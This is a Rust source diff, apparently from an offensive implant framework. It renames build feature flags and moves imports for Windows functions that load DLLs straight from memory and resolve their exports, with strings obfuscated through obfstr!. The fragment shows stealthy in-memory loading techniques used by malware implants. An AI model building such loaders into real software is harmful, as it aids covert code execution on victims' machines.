@@ -9,9 +9,9 @@ use crate::{debug, CommonError::{
     ArgsError
 }};
 #[cfg(target_os = "windows")]
-#[cfg(feature = "community")]
+#[cfg(feature = "prebuild")]
 pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
-    use crate::{MaleficLoadLibrary, LOAD_MEMORY, AUTO_RUN_DLL_MAIN};
+    use crate::win::kit::{MaleficLoadLibrary, LOAD_MEMORY, AUTO_RUN_DLL_MAIN};
     
     if bins.is_empty() || bundle.is_empty() {
         return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
@@ -31,11 +31,11 @@ pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void
 }
 
 #[cfg(target_os = "windows")]
-#[cfg(feature = "professional")]
+#[cfg(feature = "source")]
 pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const malefic_win_kit::dynamic::MaleficLoadLibrary::DarkModule, CommonError> {
     use malefic_win_kit::dynamic::
         MaleficLoadLibrary::{
-            DarkModule, MaleficLoadLibrary, AUTO_RUN_DLL_MAIN, LOAD_MEMORY
+            MaleficLoadLibrary, AUTO_RUN_DLL_MAIN, LOAD_MEMORY
         };
     
     if bins.is_empty() || bundle.is_empty() {
@@ -57,9 +57,9 @@ pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const malefi
 }
 
 #[cfg(target_os = "windows")]
-#[cfg(feature = "community")]
+#[cfg(feature = "prebuild")]
 pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
-    use crate::{MaleficGetFuncAddrWithModuleBaseDefault, DarkModule};
+    use crate::win::kit::{MaleficGetFuncAddrWithModuleBaseDefault, DarkModule};
     let module: *const DarkModule = module as _;
     if module.is_null() || !(*module).is_successed {
         return None;
@@ -73,7 +73,7 @@ pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void>
 }
 
 #[cfg(target_os = "windows")]
-#[cfg(feature = "professional")]
+#[cfg(feature = "source")]
 pub unsafe fn call_fresh_modules(module: *const malefic_win_kit::dynamic::MaleficLoadLibrary::DarkModule) -> Option<*const c_void> {
     use malefic_win_kit::dynamic::DynamicLibraryUtils::GetFuncAddrWithModuleBaseDefault;
     if module.is_null() || !(*module).is_successed {
